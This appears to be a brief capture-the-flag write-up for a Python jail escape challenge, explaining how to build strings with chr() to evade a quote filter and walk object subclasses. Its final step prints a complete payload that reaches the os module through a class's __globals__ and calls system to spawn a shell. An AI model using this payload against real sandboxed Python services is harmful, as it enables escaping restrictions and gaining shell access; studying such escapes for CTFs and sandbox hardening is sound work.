---
layout: page
title: "Jailbreak - Google CTF 2025 Writeup"
subtitle: "A Python PyJail interactive shell that blocks access to `import`, `os`, `sys`, and quotes. Escape the jail using subclasses references to read files."
permalink: /ctf/writeups/challenges/misc/jailbreak/
category: "misc"
challenge_name: "Jailbreak"
difficulty: "Easy"
event: "Google CTF 2025"
points: "110"
solves: "590"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2025
* **Difficulty**: Easy
* **Points**: 110
* **Solves**: 590
* **Category**: Misc
* **Tags**: Python Jail, Sandbox Escape, Subclasses, Builtins

---

## 📝 Description
A Python PyJail interactive shell that blocks access to `import`, `os`, `sys`, and quotes. Escape the jail using subclasses references to read files.

---

## 💡 Solution / Approach
1. The jail filters quotes, meaning we cannot use strings directly. We construct strings using `chr()` and `+`.

2. Traverse subclasses from the base class: `().__class__.__base__.__subclasses__()`.

3. Find the index of the `_frozen_importlib_external.FileFinder` or similar class that has access to system modules.

4. Build payload using Python string formatting: `().__class__.__base__.__subclasses__()[137].__init__.__globals__[chr(115)+chr(121)+chr(115)].modules[chr(111)+chr(115)].system(chr(115)+chr(104))` to trigger a shell.
